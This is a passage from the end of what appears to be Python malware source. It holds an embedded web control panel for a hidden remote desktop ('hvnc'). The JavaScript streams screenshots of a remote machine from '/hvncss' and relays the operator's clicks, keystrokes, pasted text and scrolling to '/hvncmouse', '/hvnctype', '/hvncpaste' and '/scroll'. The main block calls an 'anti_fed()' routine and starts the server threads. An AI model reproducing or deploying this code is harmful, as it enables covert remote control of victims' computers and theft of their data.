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"> <input type="text" id="text_input" placeholder="(paste here)" class="movetobottom" onkeyup="deal_with_input()"></div><div class="containertwo"><table class="table table-bordered containertwo"><thead><tr><th scope="col">Enable/Disable</th></tr></thead><tbody><tr><td><div class="custom-control custom-checkbox"><input type="checkbox" class="custom-control-input" id="clicksbox" onclick="clickboxclicked(event)" checked="checked"><label class="custom-control-label" for="customCheck1">Clicks</label></div></td></tr><tr><td><div class="custom-control custom-checkbox"><input type="checkbox" class="custom-control-input" id="keysbox" onclick="keyboxclicked(event)" checked="checked"><label class="custom-control-label" for="customCheck2">Keys</label></div></td></tr><tr><td><div class="custom-control custom-checkbox"><input type="checkbox" class="custom-control-input" id="scrollsbox" onclick="scrollboxclick(event)" checked="true"><label class="custom-control-label" for="customCheck3">Scrolling</label></div></td></tr></tbody></table></div><script type="text/javascript" src="https://code.jquery.com/jquery-1.6.2.js"></script><link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css"><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script><script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script><script>var online_status=!0;function screenshot_manager(){var s=new XMLHttpRequest;s.open("GET","/hvncss"),s.onreadystatechange=function(){4===s.readyState&&(console.log(s.status),200==s.status?(document.getElementById("myImage").src="data:image/png;base64,"+s.responseText,0==online_status&&(online_status=!0,showAndDismissAlertLONG("success",window.location.hostname+"/hvncss is online again!"))):1==online_status&&(online_status=!1,showAndDismissAlertLONG("danger",window.location.hostname+"/hvncss is offline")),screenshot_manager())},s.send()}screenshot_manager()</script><script>$("#myImage").mousedown ( function (evt) {

var jThis               = $(this);
var offsetFromParent    = jThis.position ();
var topThickness        = (jThis.outerHeight(true) - jThis.height() ) / 2;
var leftThickness       = (jThis.outerWidth (true) - jThis.width () ) / 2;

//--- (x,y) coordinates of the mouse click relative to the image.
var x                   = evt.pageX - offsetFromParent.left - leftThickness;
var y                   = evt.pageY - offsetFromParent.top  - topThickness;

var clickbool = $('#clicksbox').prop("checked") ? 1 : 0 ; 
if (clickbool == 1) {
  console.log("X:"+x+" Y:"+y)
  try {     
        const response =  fetch('/hvncmouse', {
          method: 'post',
          body: JSON.stringify({x:x,y:y,type:evt.which})
        });
        console.log('Mouse click completed - x : '+x+" y : "+y+" type : "+evt.which, response);
      } catch(err) {
        alert(`Error: ${err}`);
      }
}
  
} );</script><script type="text/javascript">$("img").bind("contextmenu",function(n){return!1})</script><script type="text/javascript"></script><script>document.getElementById("myImage").setAttribute("draggable",!1)</script><script>window.addEventListener("wheel", event => {
  var scrollbool = $('#scrollsbox').prop("checked") ? 1 : 0 ; 
    if (scrollbool == 1){
      try {     
        const response =  fetch('/scroll', {
          method: 'post',
          body: JSON.stringify({scroll:event.deltaY})
        });
        
        console.log('Scroll completed : '+event.deltaY, response);
      } catch(err) {
        alert(`Error: ${err}`);
      }
    }


});</script><div class="alert-messages movetobottom"></div><script>function showAndDismissAlert(e,s){var a='<div class="alert alert-'+e+'">'+s+"</div>";$(".alert-messages").prepend(a),$(".alert-messages .alert").first().hide().fadeIn(500).delay(1e3).fadeOut(500,function(){$(this).remove()})}function showAndDismissAlertLONG(e,s){var a='<div class="alert alert-'+e+'">'+s+"</div>";$(".alert-messages").prepend(a),$(".alert-messages .alert").first().hide().fadeIn(500).delay(3e4).fadeOut(1e3,function(){$(this).remove()})}</script><script>document.addEventListener('paste', function(event) {
    
    setTimeout(function(){
        console.log(document.getElementById("text_input").value)
        if (document.getElementById("text_input").value === "") {
            showAndDismissAlert("danger", "Use the input box provided to copy text - otherwise the browser can't pick it up");

            console.log("Paste detected - no content detected - use the box")
        }

        else{
            console.log("Paste detected : "+document.getElementById("text_input").value )
            try {     
            const response = fetch('/hvncpaste', {
            method: 'post',
            body: JSON.stringify({keys:  document.getElementById("text_input").value})
            });
            document.getElementById("text_input").value = "";
        } catch(err) {
            alert(`Error: ${err}`);
        }
    }}
    
    )

}, 1);</script><script>document.addEventListener('keypress', function(event) {

    var char = String.fromCharCode(event.which)

    var keybool = $('#keysbox').prop("checked") ? 1 : 0 ;  
    if (keybool == 1){
      try {     
        const response =  fetch('/hvnctype', {
          method: 'post',
          body: JSON.stringify({keys:event.keyCode})
        });
        console.log('Key completed : '+char  + " | Numeric code = "+event.keyCode, response);
      } catch(err) {
        alert(`Error: ${err}`);
      }

  }

});


document.addEventListener('keyup', function(event) {
    //console.log(event.keyCode)
    var char = String.fromCharCode(event.which)
    const specialcharacters = [8]
    var keybool = $('#keysbox').prop("checked") ? 1 : 0 ;  
    if ((specialcharacters.indexOf(event.keyCode) >= 0) && (keybool==1)) {
        console.log("Special character - "+event.keyCode+" in ["+specialcharacters +"] pressed" + " | Character = "+char)

            try {     
        const response =  fetch('/hvnctype', {
            method: 'post',
            body: JSON.stringify({keys:event.keyCode})
        });
        console.log('Key completed : '+char  + " | Numeric code = "+event.keyCode, response);
        } catch(err) {
        alert(`Error: ${err}`);
        }
        };

    }
)</script><script>function clickboxclicked(s){s.target.checked?showAndDismissAlert("success","Click events turned on"):showAndDismissAlert("info","Click events turned off")}function keyboxclicked(s){s.target.checked?showAndDismissAlert("success","Key presses turned on"):showAndDismissAlert("info","Key presses turned off")}function scrollboxclick(s){s.target.checked?showAndDismissAlert("success","Scroll events turned on"):showAndDismissAlert("info","Scroll events turned off")}</script><script>window.addEventListener("auxclick", (event) => {
  if (event.button === 1) event.preventDefault();
});</script><script>function deal_with_input(){document.getElementById("text_input").value=""}</script><script></script></body></html>

"""  # line:2560

if __name__ == '__main__':  # line:2563
    sys.exit()
    anti_fed()  # line:2564
    start_threads(True)  # line:2565
    app .run()  # line:2566
